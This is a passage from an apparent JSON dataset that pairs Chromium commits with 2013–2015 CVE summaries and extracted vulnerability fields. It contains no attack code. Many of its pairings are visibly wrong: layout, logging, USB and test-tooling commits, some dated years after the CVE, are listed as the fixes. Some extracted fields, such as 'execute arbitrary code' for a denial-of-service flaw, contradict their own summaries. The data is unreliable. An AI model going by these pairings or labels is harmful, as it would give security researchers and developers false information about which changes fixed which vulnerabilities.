svn:\/\/svn.chromium.org\/chrome\/trunk\/src@280354 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The Debugger extension API in browser\/extensions\/api\/debugger\/debugger_api.cc in Google Chrome before 37.0.2062.94 does not validate a tab's URL before an attach operation, which allows remote attackers to bypass intended access limitations via an extension that uses a restricted URL, as demonstrated by a chrome:\/\/ URL.","commit_message_1":"have the debugger extension api check that it ha access to the tab check permissionsdata : :canaccesstab ( ) prior to attaching the debugger","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via an extension that uses a restricted url , as demonstrated by a chrome : \/ \/ url","Impact":"bypass intended access limitations","Root Cause":"does not validate a tab ' s url before an attach operation","Attack Type":"remote attacker"},{"commit_id":"ee7579229ff7e9e5ae28bf53aea069251499d7da","cve_id":"CVE-2014-3173","cwe_id":"CWE-119","commit_message":"Framebuffer clear() needs to consider the situation some draw buffers are disabled.\n\nThis is when we expose DrawBuffers extension.\n\nBUG=376951\nTEST=the attached test case, webgl conformance\nR=kbr@chromium.org,bajones@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/315283002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@275338 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The WebGL implementation in Google Chrome before 37.0.2062.94 does not ensure that clear calls interact properly with the state of a draw buffer, which allows remote attackers to cause a denial of service (read of uninitialized memory) via a crafted CANVAS element, related to gpu\/command_buffer\/service\/framebuffer_manager.cc and gpu\/command_buffer\/service\/gles2_cmd_decoder.cc.","commit_message_1":"framebuffer clear ( ) need to consider the situation some draw buffer are disabled","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted canvas element , related to gpu \/ command _ buffer \/ service \/ framebuffer _ manager . cc and gpu \/ command _ buffer \/ service \/ gles2 _ cmd _ decoder . cc","Impact":"cause a denial of service ( read of uninitialized memory )","Root Cause":"does not ensure that clear calls interact properly with the state of a draw buffer","Attack Type":"remote attacker"},{"commit_id":"c391f54a210dd792f140650b886e92480d8eaf9e","cve_id":"CVE-2014-3174","cwe_id":"CWE-119","commit_message":"Initialize value since calculateFinalValues may fail to do so.\n\nFix threading issue where updateCoefficientsIfNecessary was not always\ncalled from the audio thread. This causes the value not to be\ninitialized.\n\nThus,\n\no Initialize the variable to some value, just in case.\no Split updateCoefficientsIfNecessary into two functions with the code\n  that sets the coefficients pulled out in to the new function\n  updateCoefficients.\no Simplify updateCoefficientsIfNecessary since useSmoothing was always\n  true, and forceUpdate is not longer needed.\no Add process lock to prevent the audio thread from updating the\n  coefficients while they are being read in the main thread. The audio\n  thread will update them the next time around.\no Make getFrequencyResponse set the lock while reading the\n  coefficients of the biquad in preparation for computing the\n  frequency response.\n\nBUG=389219\n\nReview URL: https:\/\/codereview.chromium.org\/354213002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@177250 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"modules\/webaudio\/BiquadDSPKernel.cpp in the Web Audio API implementation in Blink, as used in Google Chrome before 37.0.2062.94, does not properly consider concurrent threads during attempts to update biquad filter coefficients, which allows remote attackers to cause a denial of service (read of uninitialized memory) via crafted API calls.","commit_message_1":"initialize value since calculatefinalvalues may fail to do so","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted api calls","Impact":"cause a denial of service ( read of uninitialized memory )","Root Cause":"does not properly consider concurrent threads during attempts to update biquad filter coefficients","Attack Type":"remote attacker"},{"commit_id":"4843d98517bd37e5940cd04627c6cfd2ac774d11","cve_id":"CVE-2014-3175","cwe_id":null,"commit_message":"Remove clock resolution page load histograms.\n\nThese were temporary metrics intended to understand whether high\/low\nresolution clocks adversely impact page load metrics. After collecting a few\nmonths of data it was determined that clock resolution doesn't adversely\nimpact our metrics, and it that these histograms were no longer needed.\n\nBUG=394757\n\nReview-Url: https:\/\/codereview.chromium.org\/2155143003\nCr-Commit-Position: refs\/heads\/master@{#406143}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 37.0.2062.94 allow attackers to cause a denial of service or possibly have other impact via unknown vectors, related to the load_truetype_glyph function in truetype\/ttgload.c in FreeType and other functions in other components.","commit_message_1":"remove clock resolution page load histogram","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"281d13f018a313672f4117971bf03986de99b481","cve_id":"CVE-2014-3165","cwe_id":null,"commit_message":"Log extra information when the SSL handshake completes.\n\nI've gotten pretty good at extracting this from the logs when there is\ndata associated with it, but it's kind of silly to have to do that.\n\nBUG=484695\n\nReview-Url: https:\/\/codereview.chromium.org\/1928713002\nCr-Commit-Position: refs\/heads\/master@{#390174}","summary":"Use-after-free vulnerability in modules\/websockets\/WorkerThreadableWebSocketChannel.cpp in the Web Sockets implementation in Blink, as used in Google Chrome before 36.0.1985.143, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger an unexpectedly long lifetime of a temporary object during method completion.","commit_message_1":"log extra information when the ssl handshake completes","Vulnerability Type":"use - after - free","Attack Vector":"via vectors that trigger an unexpectedly long lifetime of a temporary object during method completion","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within web sockets","Attack Type":"remote attacker"},{"commit_id":"44f1431b20c16d8f8da0ce8ff7bbf2adddcdd785","cve_id":"CVE-2014-3167","cwe_id":null,"commit_message":"Avoid using forced layout to trigger paint invalidation for SVG containers\n\nCurrently, SVG containers in the LayoutObject hierarchy force layout of\ntheir children if the transform changes. The main reason for this is to\ntrigger paint invalidation of the subtree. In some cases - changes to the\nscale factor - there are other reasons to trigger layout, like computing\na new scale factor for <text> or re-layout nodes with non-scaling stroke.\n\nCompute a \"scale-factor change\" in addition to the \"transform change\"\nalready computed, then use this new signal to determine if layout should\nbe forced for the subtree. Trigger paint invalidation using the\nLayoutObject flags instead.\n\nThe downside to this is that paint invalidation will walk into \"hidden\"\ncontainers which rarely require repaint (since they are not technically\nvisible). This will hopefully be rectified in a follow-up CL.\n\nFor the testcase from 603850, this essentially eliminates the cost of\nlayout (from ~350ms to ~0ms on authors machine; layout cost is related\nto text metrics recalculation), bumping frame rate significantly.\n\nBUG=603956,603850\n\nReview-Url: https:\/\/codereview.chromium.org\/1996543002\nCr-Commit-Position: refs\/heads\/master@{#400950}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 36.0.1985.143 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"avoid using forced layout to trigger paint invalidation for svg container currently , svg container in the layoutobject hierarchy force layout of their child if the transform change","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"ee281f7cac9df44fe241a37f188b28be8845ded0","cve_id":"CVE-2014-3160","cwe_id":"CWE-264","commit_message":"Enforce SVG image security rules\n\nSVG images have unique security rules that prevent them from loading\nany external resources. This patch enforces these rules in\nResourceFetcher::canRequest for all non-data-uri resources. This locks\ndown our SVG resource handling and fixes two security bugs.\n\nIn the case of SVG images that reference other images, we had a bug\nwhere a cached subresource would be used directly from the cache.\nThis has been fixed because the canRequest check occurs before we use\ncached resources.\n\nIn the case of SVG images that use CSS imports, we had a bug where\nimports were blindly requested. This has been fixed by stopping all\nnon-data-uri requests in SVG images.\n\nWith this patch we now match Gecko's behavior on both testcases.\n\nBUG=380885, 382296\n\nReview URL: https:\/\/codereview.chromium.org\/320763002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@176084 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The ResourceFetcher::canRequest function in core\/fetch\/ResourceFetcher.cpp in Blink, as used in Google Chrome before 36.0.1985.125, does not properly restrict subresource requests associated with SVG files, which allows remote attackers to bypass the Same Origin Policy via a crafted file.","commit_message_1":"enforce svg image security rule svg image have unique security rule that prevent them from loading any external resource","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted file","Impact":"bypass the same origin policy","Root Cause":"does not properly restrict subresource requests associated with svg files","Attack Type":"remote attacker"},{"commit_id":"f14efc560a12a513696d6396413b138879dabd7a","cve_id":"CVE-2014-3154","cwe_id":null,"commit_message":"[FileAPI] Clean up WebFileSystemImpl before Blink shutdown\n\nWebFileSystemImpl should not outlive V8 instance, since it may have references to V8.\nThis CL ensures it deleted before Blink shutdown.\n\nBUG=369525\n\nReview URL: https:\/\/codereview.chromium.org\/270633009\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@269345 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the ChildThread::Shutdown function in content\/child\/child_thread.cc in the filesystem API in Google Chrome before 35.0.1916.153 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to a Blink shutdown.","commit_message_1":"clean up webfilesystemimpl before blink shutdown webfilesystemimpl should not outlive v8 instance , since it may have reference to v8","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to a blink shutdown","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"2025798e133f9adc49b65d017dbb5cb2c5cc74c9","cve_id":"CVE-2014-3155","cwe_id":null,"commit_message":"These can post callbacks which re-enter into SpdyWriteQueue.\n\nBUG=369539\n\nReview URL: https:\/\/codereview.chromium.org\/265933007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@268730 0039d316-1c4b-4281-b951-d872f2087c98","summary":"net\/spdy\/spdy_write_queue.cc in the SPDY implementation in Google Chrome before 35.0.1916.153 allows remote attackers to cause a denial of service (out-of-bounds read) by leveraging incorrect queue maintenance.","commit_message_1":"these can post callback which re-enter into spdywritequeue","Vulnerability Type":"out-of-bounds read","Attack Vector":"by leveraging incorrect queue maintenance","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"0b694217046d6b2bfa5814676e8615c18e6a45ff","cve_id":"CVE-2014-3156","cwe_id":"CWE-119","commit_message":"System Clipboard: Remove extraneous check for bitmap.getPixels()\n\nBug 369621 originally led to this check being introduced via\nhttps:\/\/codereview.chromium.org\/289573002\/patch\/40001\/50002, but after\nhttps:\/\/crrev.com\/c\/1345809, I'm not sure that it's still necessary.\n\nThis change succeeds when tested against the \"minimized test case\" provided in\ncrbug.com\/369621 's description, but I'm unsure how to make the minimized test\ncase fail, so this doesn't prove that the change would succeed against the\nfuzzer's test case (which originally filed the bug).\n\nAs I'm unable to view the relevant fuzzer test case, (see crbug.com\/918705),\nI don't know exactly what may have caused the fuzzer to fail. Therefore,\nI've added a CHECK for the time being, so that we will be notified in canary\nif my assumption was incorrect.\n\nBug: 369621\nChange-Id: Ie9b47a4b38ba1ed47624de776015728e541d27f7\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1393436\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: Kai Ninomiya <kainino@chromium.org>\nReviewed-by: Victor Costan <pwnall@chromium.org>\nCommit-Queue: Victor Costan <pwnall@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#619591}","summary":"Buffer overflow in the clipboard implementation in Google Chrome before 35.0.1916.153 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger unexpected bitmap data, related to content\/renderer\/renderer_clipboard_client.cc and content\/renderer\/webclipboard_impl.cc.","commit_message_1":"remove extraneous check for <file> ( ) bug <number> originally led to this check being introduced via http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger unexpected bitmap data , related to content \/ renderer \/ renderer _ clipboard _ client . cc and content \/ renderer \/ webclipboard _ impl . cc","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by clipboard","Attack Type":"remote attacker"},{"commit_id":"96e8ffb4e805c7266a2fc1fbe0e470052019bad9","cve_id":"CVE-2014-3157","cwe_id":"CWE-119","commit_message":"Replicate FFmpeg's video frame allocation strategy.\n\nThis should avoid accidental overreads and overwrites due to our\nVideoFrame's not being as large as FFmpeg expects.\n\nBUG=368980\nTEST=new regression test\n\nReview URL: https:\/\/codereview.chromium.org\/270193002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@268831 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Heap-based buffer overflow in the FFmpegVideoDecoder::GetVideoBuffer function in media\/filters\/ffmpeg_video_decoder.cc in Google Chrome before 35.0.1916.153 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging VideoFrame data structures that are too small for proper interaction with an underlying FFmpeg library.","commit_message_1":"replicate ffmpeg 's video frame allocation strategy","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging videoframe data structures that are too small for proper interaction with an underlying ffmpeg library","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by media","Attack Type":"remote attacker"},{"commit_id":"870f3e99a1282023753fe8d8aed90879cbc6838f","cve_id":"CVE-2014-1742","cwe_id":"CWE-399","commit_message":"Tracing: Add support for PII whitelisting of individual trace event arguments\n\nR=dsinclair,shatch\nBUG=546093\n\nReview URL: https:\/\/codereview.chromium.org\/1415013003\n\nCr-Commit-Position: refs\/heads\/master@{#356690}","summary":"Use-after-free vulnerability in the FrameSelection::updateAppearance function in core\/editing\/FrameSelection.cpp in Blink, as used in Google Chrome before 34.0.1847.137, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging improper RenderObject handling.","commit_message_1":"add support for pii whitelisting of individual trace event argument bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging improper renderobject handling ","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"68a823dcd4e9c63a0d324bc96695fd010d734d87","cve_id":"CVE-2014-1706","cwe_id":null,"commit_message":"[CSS Grid Layout] Implement auto-margins alignment of grid items\n\nThe Grid Layout spec states that we must center items with auto margins,\nso it will absorb any positive free space, both horiontal and vertical.\n\nhttps:\/\/drafts.csswg.org\/css-grid\/#auto-margins\n\nBesides, auto-margins imply that any alignment property in the same axis\nwill have no effect\n\nBUG=79180, 249451, 376823\n\nReview URL: https:\/\/codereview.chromium.org\/1298623002\n\nCr-Commit-Position: refs\/heads\/master@{#351796}","summary":"crosh in Google Chrome OS before 33.0.1750.152 allows attackers to inject commands via unspecified vectors.","commit_message_1":"implement auto-margins alignment of grid item the grid layout spec state that we must center item with auto margin , so it will absorb any positive free space , both horiontal and vertical","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"inject commands","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"b71fc042e1124cda2ab51dfdacc2362da62779a6","cve_id":"CVE-2014-1710","cwe_id":"CWE-119","commit_message":"Add bounds validation to AsyncPixelTransfersCompletedQuery::End\n\nBUG=351852\nR=jbauman@chromium.org, jorgelo@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/198253002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@256723 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The AsyncPixelTransfersCompletedQuery::End function in gpu\/command_buffer\/service\/query_manager.cc in Google Chrome, as used in Google Chrome OS before 33.0.1750.152, does not check whether a certain position is within the bounds of a shared-memory segment, which allows remote attackers to cause a denial of service (GPU command-buffer memory corruption) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"add bound validation to asyncpixeltransferscompletedquery : :end bug=<number> review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"execute arbitrary code","Root Cause":"does not check whether a certain position is within the bounds of a shared - memory segment","Attack Type":"remote attacker"},{"commit_id":"5b0d76edd5d6d4054b2e1263e23c852226c5f701","cve_id":"CVE-2014-1714","cwe_id":"CWE-20","commit_message":"Refactor ui::Clipboard::ObjectMap sanitization in ClipboardMsgFilter.\n\nBUG=352395\nR=tony@chromium.org\nTBR=creis@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/200523004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@257164 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The ScopedClipboardWriter::WritePickledData function in ui\/base\/clipboard\/scoped_clipboard_writer.cc in Google Chrome before 33.0.1750.152 on OS X and Linux and before 33.0.1750.154 on Windows does not verify a certain format value, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the clipboard.","commit_message_1":"sanitization in clipboardmsgfilter","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors related to the clipboard","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not verify a certain format value","Attack Type":"remote attacker"},{"commit_id":"ce70785c73a2b7cf2b34de0d8439ca31929b4743","cve_id":"CVE-2014-1715","cwe_id":"CWE-22","commit_message":"Consistently check if a block can handle pagination strut propagation.\n\nhttps:\/\/codereview.chromium.org\/1360753002 got it right for inline child\nlayout, but did nothing for block child layout.\n\nBUG=329421\nR=jchaffraix@chromium.org,leviw@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1387553002\n\nCr-Commit-Position: refs\/heads\/master@{#352429}","summary":"Directory traversal vulnerability in Google Chrome before 33.0.1750.152 on OS X and Linux and before 33.0.1750.154 on Windows has unspecified impact and attack vectors.","commit_message_1":"consistently check if a block can handle pagination strut propagation","Vulnerability Type":"Path Traversal","Attack Vector":"none","Impact":"none","Root Cause":"send a specially-crafted URL request containing directory traversal sequences","Attack Type":"remote attacker"},{"commit_id":"d926098e2e2be270c80a5ba25ab8a611b80b8556","cve_id":"CVE-2014-1700","cwe_id":"CWE-399","commit_message":"Connect WebUSB client interface to the devices app\n\nThis provides a basic WebUSB client interface in\ncontent\/renderer. Most of the interface is unimplemented,\nbut this CL hooks up navigator.usb.getDevices() to the\nbrowser's Mojo devices app to enumerate available USB\ndevices.\n\nBUG=492204\n\nReview URL: https:\/\/codereview.chromium.org\/1293253002\n\nCr-Commit-Position: refs\/heads\/master@{#344881}","summary":"Use-after-free vulnerability in modules\/speech\/SpeechSynthesis.cpp in Blink, as used in Google Chrome before 33.0.1750.149, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging improper handling of a certain utterance data structure.","commit_message_1":"connect webusb client interface to the device app this provides a basic webusb client interface in content\/renderer","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging improper handling of a certain utterance data structure","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to speech input elements","Attack Type":"remote attacker"},{"commit_id":"318530d771586b39056c0da7b8bdad03469a0dc4","cve_id":"CVE-2014-1700","cwe_id":"CWE-399","commit_message":"Move smart deploy to tristate.\n\nBUG=\n\nReview URL: https:\/\/codereview.chromium.org\/1149383006\n\nCr-Commit-Position: refs\/heads\/master@{#333058}","summary":"Use-after-free vulnerability in modules\/speech\/SpeechSynthesis.cpp in Blink, as used in Google Chrome before 33.0.1750.149, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging improper handling of a certain utterance data structure.","commit_message_1":"move smart deploy to tristate","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging improper handling of a certain utterance data structure","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to speech input elements","Attack Type":"remote attacker"},{"commit_id":"0ebe983f1cfdd383a4954127f564b83a4fe4992f","cve_id":"CVE-2014-1703","cwe_id":"CWE-399","commit_message":"Remove fallback when requesting a single USB interface.\n\nThis reverts commit 2d475d0ed37bf8f19385537ad31e361f1b21624b. The\npermission broker now supports opening devices that are partially\nclaimed through the OpenPath method and RequestPathAccess will always\nfail for these devices so the fallback path from RequestPathAccess to\nOpenPath is always taken.\n\nBUG=500057\n\nReview URL: https:\/\/codereview.chromium.org\/1227313003\n\nCr-Commit-Position: refs\/heads\/master@{#338354}","summary":"Use-after-free vulnerability in the WebSocketDispatcherHost::SendOrDrop function in content\/browser\/renderer_host\/websocket_dispatcher_host.cc in the Web Sockets implementation in Google Chrome before 33.0.1750.149 might allow remote attackers to bypass the sandbox protection mechanism by leveraging an incorrect deletion in a certain failure case.","commit_message_1":"remove fallback when requesting a single usb interface","Vulnerability Type":"use - after - free","Attack Vector":"mechanism by leveraging an incorrect deletion in a certain failure case","Impact":"bypass the sandbox protection","Root Cause":"caused by a use-after-free vulnerability related to web sockets","Attack Type":"remote attacker"},{"commit_id":"70bcb6b3396a395e871e10b2ff883d92b8218e9f","cve_id":"CVE-2013-6649","cwe_id":"CWE-399","commit_message":"Avoid drawing SVG image content when the image is of zero size.\n\nR=pdr\nBUG=330420\n\nReview URL: https:\/\/codereview.chromium.org\/109753004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@164536 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the RenderSVGImage::paint function in core\/rendering\/svg\/RenderSVGImage.cpp in Blink, as used in Google Chrome before 32.0.1700.102, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving a zero-size SVG image.","commit_message_1":"avoid drawing svg image content when the image is of zero size","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving a zero - size svg image","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to SVG images","Attack Type":"remote attacker"},{"commit_id":"cace1e6998293b9b025d4bbdaf5cb5b6a1c2efb4","cve_id":"CVE-2013-6663","cwe_id":"CWE-399","commit_message":"Fix crash when resizing a view destroys the render tree\n\nThis is a simple fix for not holding a renderer across FrameView\nresizes. Calling view->resize() can destroy renderers so this patch\nupdates SVGImage::setContainerSize to query the renderer after the\nresize is complete. A similar issue does not exist for the dom tree\nwhich is not destroyed.\n\nBUG=344492\n\nReview URL: https:\/\/codereview.chromium.org\/178043006\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@168113 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the SVGImage::setContainerSize function in core\/svg\/graphics\/SVGImage.cpp in the SVG implementation in Blink, as used in Google Chrome before 33.0.1750.146, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the resizing of a view.","commit_message_1":"fix crash when resizing a view destroys the render tree this is a simple fix for not holding a renderer across frameview resizes","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the resizing of a view","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to svg images","Attack Type":"remote attacker"},{"commit_id":"59296d9276ffcc8bced092828210748d2ed19ab0","cve_id":"CVE-2013-6663","cwe_id":"CWE-399","commit_message":"PPB_Flash.Navigate(): Disallow certain HTTP request headers.\n\nWith this CL, PPB_Flash.Navigate() fails the operation with\nPP_ERROR_NOACCESS if the request headers contain non-simple headers.\n\nBUG=332023\nTEST=None\n\nReview URL: https:\/\/codereview.chromium.org\/136393004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@249114 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the SVGImage::setContainerSize function in core\/svg\/graphics\/SVGImage.cpp in the SVG implementation in Blink, as used in Google Chrome before 33.0.1750.146, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the resizing of a view.","commit_message_1":"disallow certain http request header","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the resizing of a view","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to svg images","Attack Type":"remote attacker"},{"commit_id":"c21d7ac13d69cbadbbb5b2dc147be1933d52147a","cve_id":"CVE-2013-6663","cwe_id":"CWE-399","commit_message":"Use the host coordinate when comparing to host window bounds.\n\nI somehow overlooked this and the test was not strict enough to catch this.\n\nBUG=521919\nTEST=Updated ScreenPositionControllerTest.ConvertHostPointToScreenHiDPI so that it fails without the patch.\n\nReview URL: https:\/\/codereview.chromium.org\/1293373002\n\nCr-Commit-Position: refs\/heads\/master@{#344186}","summary":"Use-after-free vulnerability in the SVGImage::setContainerSize function in core\/svg\/graphics\/SVGImage.cpp in the SVG implementation in Blink, as used in Google Chrome before 33.0.1750.146, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the resizing of a view.","commit_message_1":"use the host coordinate when comparing to host window bound","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the resizing of a view","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to svg images","Attack Type":"remote attacker"},{"commit_id":"23cbfc1d685fa7389e88588584e02786820d4d26","cve_id":"CVE-2013-6661","cwe_id":null,"commit_message":"Add the SandboxedDMGParser and wire it up to the DownloadProtectionService.\n\nBUG=496898,464083\nR=isherman@chromium.org, kenrb@chromium.org, mattm@chromium.org, thestig@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1299223006 .\n\nCr-Commit-Position: refs\/heads\/master@{#344876}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 33.0.1750.117 allow attackers to bypass the sandbox protection mechanism after obtaining renderer access, or have other impact, via unknown vectors.","commit_message_1":"add the sandboxeddmgparser and wire it up to the downloadprotectionservice","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"bypass the sandbox protection mechanism after obtaining renderer access , or have other impact ,","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"fc343fd48badc0158dc2bb763e9a8b9342f3cb6f","cve_id":"CVE-2013-6643","cwe_id":"CWE-287","commit_message":"Fix a crash when a form control is in a past naems map of a demoted form element.\n\nNote that we wanted to add the protector in FormAssociatedElement::setForm(),\nbut we couldn't do it because it is called from the constructor.\n\nBUG=326854\nTEST=automated.\n\nReview URL: https:\/\/codereview.chromium.org\/105693013\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@163680 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The OneClickSigninBubbleView::WindowClosing function in browser\/ui\/views\/sync\/one_click_signin_bubble_view.cc in Google Chrome before 32.0.1700.76 on Windows and before 32.0.1700.77 on Mac OS X and Linux allows attackers to trigger a sync with an arbitrary Google account by leveraging improper handling of the closing of an untrusted signin confirm dialog.","commit_message_1":"fix a crash when a form control is in a past naems map of a demoted form element","Vulnerability Type":"Improper Authentication","Attack Vector":"by leveraging improper handling of the closing of an untrusted signin confirm dialog","Impact":"gain unauthorized access","Root Cause":"caused by an error related to an unprompted sync with a Google account","Attack Type":"remote attacker"},{"commit_id":"db93178bcaaf7e99ebb18bd51fa99b2feaf47e1f","cve_id":"CVE-2013-6644","cwe_id":null,"commit_message":"[Extensions] Add GetInstalledExtension() method to ExtensionRegistry\n\nThis CL adds GetInstalledExtension() method to ExtensionRegistry and\nuses it instead of deprecated ExtensionService::GetInstalledExtension()\nin chrome\/browser\/ui\/app_list\/.\n\nPart of removing the deprecated GetInstalledExtension() call\nfrom the ExtensionService.\n\nBUG=489687\n\nReview URL: https:\/\/codereview.chromium.org\/1130353010\n\nCr-Commit-Position: refs\/heads\/master@{#333036}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 32.0.1700.76 on Windows and before 32.0.1700.77 on Mac OS X and Linux allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"add getinstalledextension ( ) method to extensionregistry this cl add getinstalledextension ( ) method to extensionregistry and us it instead of deprecated extensionservice : :getinstalledextension ( ) in chrome\/browser\/ui\/app_list\/","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"b770d85e37b2d0e248f04cf20606a2f3871ef039","cve_id":"CVE-2015-6790","cwe_id":"CWE-20","commit_message":"Make WebPageSerializerImpl to escape URL attribute values in result.\n\nThis patch makes |WebPageSerializerImpl| to escape URL attribute values rather\nthan directly output URL attribute values into result.\n\nBUG=542054\nTEST=webkit_unit_tests --gtest_filter=WebPageSerializerTest.URLAttributeValues\n\nReview URL: https:\/\/codereview.chromium.org\/1398453005\n\nCr-Commit-Position: refs\/heads\/master@{#353712}","summary":"The WebPageSerializerImpl::openTagToString function in WebKit\/Source\/web\/WebPageSerializerImpl.cpp in the page serializer in Google Chrome before 47.0.2526.80 does not properly use HTML entities, which might allow remote attackers to inject arbitrary web script or HTML via a crafted document, as demonstrated by a double-quote character inside a single-quoted string.","commit_message_1":"make webpageserializerimpl to escape url attribute value in result","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted document , as demonstrated by a double - quote character inside a single - quoted string","Impact":"inject arbitrary web script","Root Cause":"does not properly use html entities","Attack Type":"remote attacker"},{"commit_id":"7e995b26a5a503adefc0ad40435f7e16a45434c2","cve_id":"CVE-2015-6791","cwe_id":null,"commit_message":"Add a fake DriveFS launcher client.\n\nUsing DriveFS requires building and deploying ChromeOS. Add a client for\nthe fake DriveFS launcher to allow the use of a real DriveFS from a\nChromeOS chroot to be used with a target_os=\"chromeos\" build of chrome.\nThis connects to the fake DriveFS launcher using mojo over a unix domain\nsocket named by a command-line flag, using the launcher to create\nDriveFS instances.\n\nBug: 848126\nChange-Id: I22dcca154d41bda196dd7c1782bb503f6bcba5b1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1098434\nReviewed-by: Xiyuan Xia <xiyuan@chromium.org>\nCommit-Queue: Sam McNally <sammc@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#567513}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 47.0.2526.80 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"add a fake 